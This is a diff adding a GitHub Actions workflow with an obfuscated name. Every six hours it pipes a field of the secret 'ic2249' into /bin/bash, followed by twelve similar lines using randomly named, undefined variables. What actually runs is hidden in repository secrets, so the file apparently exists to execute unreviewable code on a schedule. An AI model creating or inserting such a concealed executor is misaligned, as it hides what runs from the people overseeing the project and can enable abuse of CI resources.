@@ -1,0 +1,31 @@
+name: yuandabokai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuandabokai
+        env:
+          ic2249: ${{ secrets.ic2249 }}
+        run: |
+          echo $ic2249 | jq -r .ycjlf89 | /bin/bash
+          echo $urb32816 | jq -r .t466 | /bin/bash
+          echo $r445 | jq -r .lbmf589 | /bin/bash
+          echo $fy04770 | jq -r .euc47 | /bin/bash
+          echo $wiymi477 | jq -r .lv06 | /bin/bash
+          echo $oiqb0464 | jq -r .mic15670 | /bin/bash
+          echo $fmt27455 | jq -r .fy529 | /bin/bash
+          echo $elc88 | jq -r .sonbi3494 | /bin/bash
+          echo $mtlq76132 | jq -r .t2 | /bin/bash
+          echo $bfgf552 | jq -r .krf20 | /bin/bash
+          echo $azkyc9 | jq -r .pt5 | /bin/bash
+          echo $y3 | jq -r .m3 | /bin/bash
+          echo $culut3610 | jq -r .v5389 | /bin/bash
+
